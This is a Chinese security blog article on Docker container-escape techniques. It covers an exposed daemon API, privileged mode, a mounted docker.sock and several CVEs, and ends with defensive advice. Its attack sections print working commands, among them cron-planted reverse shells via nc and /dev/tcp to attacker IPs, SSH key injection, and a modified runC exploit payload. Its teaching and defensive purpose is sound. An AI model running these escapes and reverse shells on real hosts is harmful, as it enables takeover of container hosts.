# 【容器安全防线】Docker攻击方式与防范技术探究

阅读量 **266565**

发布时间 : 2023-04-24 14:51:33

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

**什么是Docker？**

Docker
是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的Linux或Windows操作系统的机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。

一个完整的Docker有以下几个部分组成：

1、DockerClient客户端

2、Docker Daemon守护进程

3、Docker Image镜像

4、DockerContainer容器

**Docker架构**

Docker 使用客户端-服务器 (C/S) 架构模式，使用远程API来管理和创建Docker容器。Docker 容器通过 Docker
镜像来创建。容器与镜像的关系类似于面向对象编程中的对象与类。

Docker采用 C/S架构 Docker daemon 作为服务端接受来自客户的请求，并处理这些请求（创建、运行、分发容器）。
客户端和服务端既可以运行在一个机器上，也可通过 socket 或者RESTful API 来进行通信。

Docker daemon 一般在宿主主机后台运行，等待接收来自客户端的消息。 Docker 客户端则为用户提供一系列可执行命令，用户用这些命令实现跟
Docker daemon 交互。

**Docker常见命令**

列出镜像列表

docker images

列出容器列表

docker ps -a

停止和删除容器

docker stop/rm [CONTAINER ID]

删除镜像

docker rmi [IMAGE ID]

PS:删除镜像时，需要先停止运行的容器

查询镜像

docker search [NAME]

获取镜像

docker pull [NAME]

交互式方法启动镜像

docker run -it [REPOSITORY] /bin/bash

访问容器

docker exec -it [CONTAINER ID] /bin/bash

退出容器

exit/ctrl+p+q

**如何判断当前机器是否为Docker容器环境**

进程数很少

常见的一些命令无法使用

查看根目录下是否存在

.dockerenv文件

docker环境下：ls -alh /.dockerenv

非docker环境，没有.dockerenv文件

利用

cat /proc/1/cgroup 是否存在docker相关信息

通过

mount查看挂载磁盘是否存在docker相关信息

**Docker攻击手法**

**Docker危险配置引起的逃逸**

安全往往在痛定思痛时得到发展。在这些年的迭代中，容器社区一直在努力将”纵深防御”、”最小权限”等理念和原则落地。例如，Docker已经将容器运行时的Capabilities黑名单机制改为如今的默认禁止所有Capabilities，再以白名单方式赋予容器运行所需的最小权限。
然而，无论是细粒度权限控制还是其他安全机制，用户都可以通过修改容器环境配置或在运行容器时指定参数来缩小或扩大约束。如果用户为不完全受控的容器提供了某些危险的配置参数，就为攻击者提供了一定程度的逃逸可能性，有的时候用户才是安全最大的隐患。

**docker daemon api 未授权访问漏洞**

Vulhub提供了docker daemon api 未授权访问漏洞的漏洞环境

[https://](https://link.zhihu.com/?target=https%3A//github.com/vulhub/vulhub/tree/master/docker/unauthorized-rce)[github.com/vulhub/vulhu](https://link.zhihu.com/?target=https%3A//github.com/vulhub/vulhub/tree/master/docker/unauthorized-rce)[b/tree/master/docker/unauthorized-rce](https://link.zhihu.com/?target=https%3A//github.com/vulhub/vulhub/tree/master/docker/unauthorized-rce)

编译及启动漏洞环境:

docker-compose build

docker-compose up -d

环境启动后，docker daemon api的端口为2375端口

利用方法是，我们随意启动一个容器，并将宿主机的/etc目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。

反弹shell的exp:

import docker

client =
docker.DockerClient(base_url=’[http://](https://link.zhihu.com/?target=http%3A//your-ip)[your-ip](https://link.zhihu.com/?target=http%3A//your-ip):[2375/’)](https://link.zhihu.com/?target=http%3A//your-ip%3A2375/)

data = client.containers.run(‘alpine:latest’, r”’sh –[c “echo ‘* * * * *
/](https://link.zhihu.com/?target=http%3A//your-ip%3A2375/)usr/bin/nc your-ip
21 -e /bin/sh’ >> /tmp/etc/crontabs/root” ”’, remove=True, volumes={‘/etc’:
{‘bind’: ‘/tmp/etc’, ‘mode’: ‘rw’}})

也可直接利用github上的exp进行攻击

[https://](https://link.zhihu.com/?target=https%3A//github.com/Tycx2ry/docker_api_vul)[github.com/Tycx2ry/dock](https://link.zhihu.com/?target=https%3A//github.com/Tycx2ry/docker_api_vul)[er_api_vul](https://link.zhihu.com/?target=https%3A//github.com/Tycx2ry/docker_api_vul)

修复方案

1.关闭2375端口（尤其是公网情况下一定要禁用此端口）

2.在防火墙上配置禁止外网访问2375端口

**privileged特权模式启动docker**

启动Docker容器。使用–privileged参数时，容器可以完全访问所有设备，并且不受seccomp，AppArmor和Linux
capabilities的限制。

利用特权模式启动一个docker容器

docker run -it –privileged centos /bin/bash

查看当前容器是否是特权容器

cat /proc/1/status | grep Cap

如果查询的值是0000000xffffffff，可以说明当前容器是特权容器。

查看磁盘文件,发现宿主机设备为/dev/sda1

fdisk -l

在特权模式下，直接在容器内挂载宿主机磁盘，接着切换根目录。

新建一个目录: mkdir /mb

挂载宿主机磁盘到新建的目录: mount /dev/sda2 /mb

切换根目录: chroot /mb

chroot是change root，改变程序执行时所参考的根目录位置，chroot可以增加系统的安全性，限制使用者能够做的事。

创建计划任务，反弹宿主机Shell

echo ‘* * * * * /bin/bash -i >& /dev/tcp/192.168.58.138/6666 0>&1’ >>
/mb/var/spool/cron/crontabs/root

挂载宿主机的root目录到容器，写入SSH私钥登录

docker run -it -v /root:/root centos /bin/bash

mkdir /root/.ssh

cat id_rsa.pub >> /root/.ssh/authorized_keys

相关启动参数存在的安全问题：

Docker 通过Linux
namespace实现6项资源隔离，包括主机名、用户权限、文件系统、网络、进程号、进程间通讯。但部分启动参数授予容器权限较大的权限，从而打破了资源隔离的界限。

–cap-add=SYS_ADMIN 启动时，允许执行mount特权操作，需获得资源挂载进行利用。

–net=host 启动时，绕过Network Namespace

–pid=host 启动时，绕过PID Namespace

–ipc=host 启动时，绕过IPC Namespace

**危险挂载docker.sock到容器内部**

在docker容器中调用和执行宿主机的docker，将docker宿主机的docker文件和docker.sock文件挂载到容器中，可以理解为套娃。

docker run –rm -it \

-v /var/run/docker.sock:/var/run/docker.sock \

-v /usr/bin/docker:/usr/bin/docker \

ubuntu \

/bin/bash

通过find在容器中查找docker.sock

find / -name docker.sock

查看宿主机docker信息

docker -H unix://var/run/docker.sock info

运行一个新的容器并挂载宿主机根路径

docker -H unix:///var/run/docker.sock run -it -v /:/mb ubuntu /bin/bash

在新容器的/mb 目录下，就可以访问到宿主机的全部资源

ls -al /mb

在新容器内执行chroot将根目录切换到挂载的宿主机根目录

chroot /mb

成功逃逸到宿主机。

**Docker程序漏洞导致的逃逸**

**Shocker攻击**

**漏洞描述**

从Docker容器逃逸并读取到主机某个目录的文件内容。Shocker攻击的关键是执行了系统调用open_by_handle_at函数，Linux手册中特别提到调用open_by_handle_at函数需要具备CAP_DAC_READ_SEARCH能力，而Docker1.0版本对Capability使用黑名单管理策略，并且没有限制CAP_DAC_READ_SEARCH能力，因而引发了容器逃逸的风险。

**漏洞影响版本**

Docker版本 1.0， 存在于 Docker 1.0 之前的绝大多数版本(目前基本上不会存在了)

**POC**

[https://](https://link.zhihu.com/?target=https%3A//github.com/gabrtv/shocker)[github.com/gabrtv/shock](https://link.zhihu.com/?target=https%3A//github.com/gabrtv/shocker)[er](https://link.zhihu.com/?target=https%3A//github.com/gabrtv/shocker)

**runC容器逃逸漏洞（CVE-2019-5736）**

**漏洞描述**

Docker 18.09.2之前的版本中使用了的runc版本小于1.0-rc6，因此允许攻击者重写宿主机上的runc
二进制文件，攻击者可以在宿主机上以root身份执行命令。

**漏洞影响版本**

Docker版本 18.09.2，runc版本 1.0-rc6，一般情况下，可通过 docker 和docker -version查看当前版本情况。

**POC**

[https://](https://link.zhihu.com/?target=https%3A//github.com/Frichetten/CVE-2019-5736-PoC)[github.com/Frichetten/C](https://link.zhihu.com/?target=https%3A//github.com/Frichetten/CVE-2019-5736-PoC)[VE-2019-5736-PoC](https://link.zhihu.com/?target=https%3A//github.com/Frichetten/CVE-2019-5736-PoC)

**攻击流程**

1、漏洞环境搭建(Ubuntu 18.04)

自动化搭建

curl[https://](https://link.zhihu.com/?target=https%3A//gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw)[gist.githubusercontent.com](https://link.zhihu.com/?target=https%3A//gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw)[/thinkycx/e2c9090f035d7b09156077903d6afa51/raw](https://link.zhihu.com/?target=https%3A//gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw)-o
install.sh && bash install.sh

docker拉取镜像慢的话可以自行百度换源

2、下载poc并修改编译

git
clone[https://](https://link.zhihu.com/?target=https%3A//github.com/Frichetten/CVE-2019-5736-PoC)[github.com/Frichetten/C](https://link.zhihu.com/?target=https%3A//github.com/Frichetten/CVE-2019-5736-PoC)[VE-2019-5736-PoC](https://link.zhihu.com/?target=https%3A//github.com/Frichetten/CVE-2019-5736-PoC)

修改paylod

vi main.go

payload = “#!/bin/bash \n bash -i >& /dev/tcp/ip/port 0>&1”

编译poc

CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go

需要提前安装golang-go和gccgo-go

3、复制编译好的poc到docker里

docker cp main 52fd26fd140f:/tmp

4、在docker里运行main文件

5、模拟管理员通过exec进入容器，触发payload

sudo docker exec -it 52fd26fd140f /bin/bash

6、成功获取宿主机反弹回来的shell

漏洞复现成功之后，docker容器将无法使用

**Docker cp命令容器逃逸攻击漏洞（CVE-2019-14271）**

**漏洞描述**

当Docker宿主机使用cp命令时，会调用辅助进程docker-tar，该进程没有被容器化，且会在运行时动态加载一些libnss*.so库。黑客可以通过在容器中替换libnss*.so等库，将代码注入到docker-tar中。当Docker用户尝试从容器中拷贝文件时将会执行恶意代码，成功实现Docker逃逸，获得宿主机root权限。

**漏洞影响版本**

Docker 19.03.0

**攻击流程**

[https://](https://link.zhihu.com/?target=https%3A//unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/)[unit42.paloaltonetworks.com](https://link.zhihu.com/?target=https%3A//unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/)[/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/](https://link.zhihu.com/?target=https%3A//unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/)

**Docker Build时的命令注入漏洞(CVE-2019-13139)**

**漏洞描述**

攻击者能够提供或操纵“docker build”命令的构建路径将能够获得命令执行。 “docker build”处理远程 git URL
的方式存在问题，并导致命令注入到底层“git clone”命令中，导致代码在用户执行“docker build”命令的上下文中执行。

**漏洞影响版本**

Docker 18.09.4之前的版本

**攻击流程**

[https://](https://link.zhihu.com/?target=https%3A//staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/)[staaldraad.github.io/po](https://link.zhihu.com/?target=https%3A//staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/)[st/2019-07-16-cve-2019-13139-docker-build/](https://link.zhihu.com/?target=https%3A//staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/)

**host模式容器逃逸漏洞(CVE-2020-15257)**

**漏洞描述**

Containerd 是一个控制 runC 的守护进程，提供命令行客户端和API，用于在一个机器上管理容器。

在版本1.3.9之前和1.4.0~1.4.2的Containerd中，由于在网络模式为host的情况下，容器与宿主机共享一套Network
namespace ，此时containerd-shim
API暴露给了用户，而且访问控制仅仅验证了连接进程的有效UID为0，但没有限制对抽象Unix域套接字的访问，刚好在默认情况下，容器内部的进程是以root用户启动的。在两者的共同作用下，容器内部的进程就可以像主机中的containerd一样，连接containerd-shim监听的抽象Unix域套接字，调用containerd-shim提供的各种API，从而实现容器逃逸。

**漏洞影响版本**

containerd < 1.4.3

containerd < 1.3.9

**攻击流程**

1、漏洞环境搭建

使用ubuntu 18.04 + metarget进行搭建(使用非18.04的ubuntu镜像会出现错误)

git clone[https://](https://link.zhihu.com/?target=https%3A//github.com/brant-ruan/metarget.git)[github.com/brant-ruan/m](https://link.zhihu.com/?target=https%3A//github.com/brant-ruan/metarget.git)[etarget.git](https://link.zhihu.com/?target=https%3A//github.com/brant-ruan/metarget.git)

pip3 insta[ll -r
requirements.txt](https://link.zhihu.com/?target=https%3A//github.com/brant-ruan/metarget.git)

./metarget[cnv install
cve-2020-15257](https://link.zhihu.com/?target=https%3A//github.com/brant-ruan/metarget.git)

2、启动容器

sudo docker run -it –net=host –name=15257 ubuntu /bin/bash

在容器内执行命令cat /proc/net/unix|grep -a “containerd-shim”,来判断是否可看到抽象命名空间Unix域套接字

3、反弹宿主机的shell

攻击机监听6666端口，下载漏洞利用工具[CDK](https://link.zhihu.com/?target=https%3A//github.com/cdk-team/CDK/),将CDK传入容器tmp目录下

sudo docker cp cdk_linux_amd64 15257:/tmp

赋予工具权限，运行工具，执行反弹shell命令,成功得到一个宿主机的shell

cd /tmp

chmod 777

./cdk_linux_amd64 run shim-pwn reverse attacker-ip port

**内核漏洞导致Docker逃逸**

**DirtyCow脏牛漏洞实现Docker逃逸(CVE-2016-5195)**

**漏洞描述**

Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，通过它可实现Docker容器逃逸，获得root权限的shell。

Docker与宿主机共享内核，所以容器需要在存在dirtyCow漏洞的宿主机里

**攻击流程**

1、下载容器并运行

git
clone[https://](https://link.zhihu.com/?target=https%3A//github.com/gebl/dirtycow-docker-vdso.git)[github.com/gebl/dirtyco](https://link.zhihu.com/?target=https%3A//github.com/gebl/dirtycow-docker-vdso.git)[w-docker-vdso.git](https://link.zhihu.com/?target=https%3A//github.com/gebl/dirtycow-docker-vdso.git)

cd dirtyco[w-docker-vdso/](https://link.zhihu.com/?target=https%3A//github.com/gebl/dirtycow-docker-vdso.git)

sudo docke[r-compose run dirtycow
/bin/bash](https://link.zhihu.com/?target=https%3A//github.com/gebl/dirtycow-docker-vdso.git)

2、进入容器编译POC并运行

cd /dirtycow-vdso/

make

./0xdeadbeef ip:port

3、攻击机监听端口接受宿主机反弹的shell

nc -lvvp port

**Docker容器的防护方案**

限制容器权限：在运行容器时，可以使用命令行选项或Dockerfile指令来限制容器的访问权限，例如使用 –cap-drop选项禁止容器获得特权模式。这可以减少攻击面。

定期更新容器软件包：及时更新容器中的软件包、库和依赖项，可以修复已知漏洞并提高安全性。

配置容器网络：通过配置容器网络来控制容器之间的通信，并限制对外部系统的访问，以保护容器免受网络攻击。

加强认证和授权：设置强密码、使用多因素身份验证、限制特定用户的访问权限等方法，可以增强容器的认证和授权机制，从而限制未经授权的访问。

监视容器健康状态：实时监视容器的健康状态，对异常事件进行快速诊断和响应，可以避免未知漏洞或攻击导致的容器故障。

应用安全最佳实践：遵循安全最佳实践，如使用最小化镜像、启用安全审计、使用容器映像签名等方法，可以进一步提高容器的安全性。

**参考文献**

[https://](https://link.zhihu.com/?target=https%3A//cloud.tencent.com/developer/article/2099396)[cloud.tencent.com/devel](https://link.zhihu.com/?target=https%3A//cloud.tencent.com/developer/article/2099396)[oper/article/2099396](https://link.zhihu.com/?target=https%3A//cloud.tencent.com/developer/article/2099396)

[https://www.](https://link.zhihu.com/?target=https%3A//www.cnblogs.com/xiaozi/p/13423853.html)[cnblogs.com/xiaozi/p/13](https://link.zhihu.com/?target=https%3A//www.cnblogs.com/xiaozi/p/13423853.html)[423853.html](https://link.zhihu.com/?target=https%3A//www.cnblogs.com/xiaozi/p/13423853.html)

[https://](https://link.zhihu.com/?target=https%3A//xz.aliyun.com/t/8558)[xz.aliyun.com/t/8558](https://link.zhihu.com/?target=https%3A//xz.aliyun.com/t/8558)

[https://](https://link.zhihu.com/?target=https%3A//xz.aliyun.com/t/7881)[xz.aliyun.com/t/7881](https://link.zhihu.com/?target=https%3A//xz.aliyun.com/t/7881)

[https://www.](https://link.zhihu.com/?target=https%3A//www.cdxy.me/%3Fp%3D837)[cdxy.me/?](https://link.zhihu.com/?target=https%3A//www.cdxy.me/%3Fp%3D837)[p=837](https://link.zhihu.com/?target=https%3A//www.cdxy.me/%3Fp%3D837)

[https://www.](https://link.zhihu.com/?target=https%3A//www.cnblogs.com/xiaozi/p/13423853.html)[cnblogs.com/xiaozi/p/13](https://link.zhihu.com/?target=https%3A//www.cnblogs.com/xiaozi/p/13423853.html)[423853.html](https://link.zhihu.com/?target=https%3A//www.cnblogs.com/xiaozi/p/13423853.html)

[https://](https://link.zhihu.com/?target=https%3A//gitee.com/wangwenqin1/metarget%23/wangwenqin1/metarget/blob/master/writeups_cnv/docker-containerd-cve-2020-15257)[gitee.com/wangwenqin1/m](https://link.zhihu.com/?target=https%3A//gitee.com/wangwenqin1/metarget%23/wangwenqin1/metarget/blob/master/writeups_cnv/docker-containerd-cve-2020-15257)[etarget#/wangwenqin1/metarget/blob/master/writeups_cnv/docker-containerd-cve-2020-15257](https://link.zhihu.com/?target=https%3A//gitee.com/wangwenqin1/metarget%23/wangwenqin1/metarget/blob/master/writeups_cnv/docker-containerd-cve-2020-15257)

[https://www.](https://link.zhihu.com/?target=https%3A//www.shangyun51.com/articledetail%3Fid%3D3932)[shangyun51.com/articled](https://link.zhihu.com/?target=https%3A//www.shangyun51.com/articledetail%3Fid%3D3932)[etail?id=3932](https://link.zhihu.com/?target=https%3A//www.shangyun51.com/articledetail%3Fid%3D3932)

**重点活动推荐**

**2023年4月18日，青藤将举办“云时代，安全变了——2023云安全高峰论坛暨青藤品牌升级发布会”，会上青藤将正式发布：**

**（1）“青藤品牌新定位及Slogan”**

**（2）“青藤-先进云安全整体解决方案”及“新产品”**

**（3）国内首个“基于AI新一代入侵检测能力模型”**

**（4）国内首个《云安全能力成熟度全景图》报告**

![](https://p0.ssl.qhimg.com/t0186285c5fc110724d.png)

参会报名通道

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **青藤云安全** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/288211](/post/id/288211)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

 **+1** __6赞

 __收藏

![](https://p0.ssl.qhimg.com/t019b4ff4d7c3c1dd63.png) 青藤云安全

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

